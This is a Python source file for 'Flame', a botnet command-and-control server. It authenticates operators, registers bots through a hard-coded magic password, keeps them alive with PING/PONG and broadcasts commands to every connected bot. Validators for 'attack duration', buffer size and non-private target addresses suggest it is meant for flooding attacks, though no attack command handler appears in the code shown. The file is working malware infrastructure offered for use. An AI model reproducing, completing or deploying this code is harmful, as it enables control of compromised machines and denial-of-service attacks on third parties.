import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init
from pathlib import Path

bots = {}
ansi_clear = '\033[2J\033[H'

banner = f'''
                  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
                  ┃ ███████╗██╗░░░░░░█████╗░███╗░░░███╗███████╗ ┃
                  ┃ ██╔════╝██║░░░░░██╔══██╗████╗░████║██╔════╝ ┃
                  ┃ █████╗░░██║░░░░░███████║██╔████╔██║█████╗░░ ┃
                  ┃ ██╔══╝░░██║░░░░░██╔══██║██║╚██╔╝██║██╔══╝░░ ┃
                  ┃ ██║░░░░░███████╗██║░░██║██║░╚═╝░██║███████╗ ┃
                  ┃ ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝ ┃ {Fore.GREEN}-V0.2
                  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
        '''

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    """ read credentials from logins file """
    credentials = [x.strip() for x in open(f'{Path(__file__).parent.absolute()}\logins.+').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split('--')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)

        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;Flame | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)
    opened = 0
    if (opened == 0):
        send(client, "Type .HELP to get started(Not case sensitive)\r\n", False)

    prompt = f'{Fore.LIGHTBLUE_EX}Flame {Fore.LIGHTWHITE_EX}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            if command.upper() == '.HELP':
                send(client, '.HELP: Shows list of commands')
                send(client, '.CLEAR: Clears the screen')
                send(client, '.LOGOUT: Disconnects from server')
                send(client, '.BOTS: Displays info of connected bots.')
                send(client, '.POPUP: Displays a popup to all bots, instead of a space, do an asterisk aka the * symbol')
                send(client, '')

            elif command.upper() == '.CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command.upper() == '.LOGOUT':
                send(client, 'Cya')
                time.sleep(1)
                break

            elif command.upper() == '.BOTS':
                if (len(args) == 1):
                    for bot in bots.keys():
                        send(bot, 'INFO_REQUEST', False, False)
                        send(client, bot.recv(1024).decode())
                else:
                    send(client, "This command takes no args.")

            

        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;Flame | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): # i know... this is ugly...
            password = client.recv(1024).decode('cp1252').strip()
        break

    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
